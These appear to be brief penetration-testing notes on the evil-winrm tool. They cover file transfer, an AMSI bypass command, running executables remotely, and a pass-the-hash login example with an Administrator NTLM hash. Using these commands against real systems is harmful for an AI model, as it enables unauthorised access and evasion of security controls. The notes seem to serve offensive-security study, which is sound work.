features you may not know

`upload
`download
	using these transfers the whole directory over


Only Powershell
so...

powershell -ep bypass alternative
	`Bypass-4MSI

`menu
	view commands

`Invoke-Binary <file>.exe`
	can run exe files


PtH example
	`evil-winrm --ip 172.16.141.11 --user Administrator -H f1014ac49bae005ee3ece5f47547d185
